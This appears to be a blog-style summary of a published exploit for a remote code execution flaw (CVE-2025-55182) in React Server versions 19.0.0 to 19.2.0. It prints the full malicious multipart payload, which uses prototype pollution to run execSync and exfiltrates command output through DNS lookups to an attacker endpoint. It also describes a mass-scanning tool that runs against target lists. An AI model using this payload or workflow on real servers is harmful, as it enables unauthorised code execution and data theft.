---
title: React Server 19.2.0 - Remote Code Execution
date: 2026-04-09
categories: [SECURITY]
tags: [REACT,VULNERABILITY,RCE,EXPLOIT]
---

## React Server 19.2.0 - Remote Code Execution 🚨

A Remote Code Execution (RCE) vulnerability, tracked as CVE-2025-55182, affects React Server versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0. This exploit was disclosed on 2025-12-05 by exploit author **EynaExp**. The vulnerability has been tested on both **Windows** and **Linux** operating systems.

### Exploit Details 🔍

The exploit targets vulnerable React Server instances through a specifically crafted HTTP POST request. The request headers used in the proof-of-concept (PoC) include:
- **User-Agent**: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
- **Next-Action**: "x"
- **Content-Type**: "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

The core of the exploit lies within the `request_body`, which is a `multipart/form-data` payload.

### Payload Structure 📦

The `request_body` includes two main parts:
1. The first part, named "0", contains a JSON payload:
   ```json
   {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('nslookup `"+CMD+"`."+dns_endpoint+"');","_formData":{"get":"$1:constructor:constructor"}}}
   ```
   This payload attempts to leverage `process.mainModule.require('child_process').execSync` to execute system commands, demonstrated by an `nslookup` command that includes placeholders for a user-defined command (`CMD`) and DNS endpoint (`dns_endpoint`).
2. The second part of the request body, named "1", simply contains "\"$@0\"".

### PoC Tool Usage 🛠️

The PoC tool, provided by EynaExp, includes specific usage instructions for deploying the scanner:
- **APP USAGE**: `[-d] <DNS(without http/s)>[-l] <Targets file path(url wordlist)>[-C] <Command>`

It is designed to load multiple targets from a file and perform a multi-threaded scan. Upon successful exploitation, it returns a status code and content length, along with any matching headers like **x-action**, **next-action**, or **rsc**.

> **Disclaimer**: This tool is released for **EDUCATIONAL** and **AUTHORIZED TESTING** purposes only. The author is not responsible for any misuse or damage caused by this program.

To read the complete article see:
[Read full article](https://www.exploit-db.com/exploits/52506)